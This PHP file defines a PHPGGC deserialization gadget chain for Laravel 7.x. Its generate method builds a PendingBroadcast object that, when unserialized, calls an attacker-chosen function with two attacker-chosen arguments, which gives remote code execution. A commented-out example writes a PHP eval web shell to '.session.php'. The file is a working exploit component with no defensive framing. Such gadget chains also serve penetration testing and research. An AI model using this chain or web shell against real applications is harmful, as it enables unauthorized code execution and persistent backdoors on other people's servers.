<?php

namespace GadgetChain\Laravel;

class RCE0 extends \PHPGGC\GadgetChain\RCE\DoubleFunctionCall
{
    public static $version = '7.x';
    public static $vector = '__destruct';
    public static $author = 'w1ndc0me';
    public static $information = '
        call_user_func_array();
        能传两个参数;
    ';

    public function generate(array $parameters)
    {
//        $function = 'file_put_contents';
/*        $parameters = array('.session.php','<? @eval($_POST["php_session_tmp"]);?>');*/
//        // $staticinvocation = new PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);
        $function = $parameters['function'];
        $parameters_tmp = array($parameters['parameter1'],$parameters['parameter2']);
        $staticinvocation = new \PHPUnit\Framework\MockObject\Invocation($parameters_tmp);
        $returncallback = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback($function);
        $defaultgenerator = new \Faker\DefaultGenerator($staticinvocation);
        $validgenerator = new \Faker\ValidGenerator($defaultgenerator,array($returncallback,'invoke'),2);
        $pendingbroadcast = new \Illuminate\Broadcasting\PendingBroadcast($validgenerator,123);
        return $pendingbroadcast;
    }
}
